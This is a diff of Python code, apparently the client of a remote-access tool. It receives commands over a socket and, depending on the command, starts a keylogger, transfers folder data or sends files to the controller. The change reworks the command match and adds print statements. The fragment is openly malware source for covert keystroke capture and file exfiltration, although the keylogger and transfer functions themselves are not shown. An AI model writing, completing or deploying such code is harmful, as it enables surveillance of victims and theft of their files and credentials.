@@ -23,21 +23,26 @@ while True:
                 while True:
                     data = conn.recv(64).decode("utf-8") 
                     # The command section:
-                    match data:
-                        case "run -keylogger":
-                            keylogger.start_keylogger()
-                            print("Client Started the keylogger.")
-                            data = " "
+                    if data:
+                        match data:
+                            case "run -keylogger":
+                                print("Client Started the keylogger.")
+                                print("Command: ", {data})
+                                keylogger.start_keylogger()
+                                data = ""
 
-                        # To je kokotské implementovanie, ale nemusím 500 if dávať
-                        case data if "run -gf" == data:
-                            userscanner.start_FolderData(data)
-                            print("Client Started the Folder Transfer.")
-                            data = " "
+                            # To je kokotské implementovanie, ale nemusím 500 if dávať
+                            case data if "run -gf" == data:
+                                print("Client Started the Folder Transfer.")
+                                print("Command: ", {data})
+                                userscanner.start_FolderData(data)
+                                data = ""
 
-                        case data if "run -gfc" in data:
-                            userscanner.start_sendFiles(data)
-                            print("Client Started the FileTransfer.")
-                            data = " "
+                            case data if "run -gfc" in data:
+                                print("Client Started the FileTransfer.")
+                                print("Command: ", {data})
+                                userscanner.start_sendFiles(data)
+                                data = ""
+
 
        
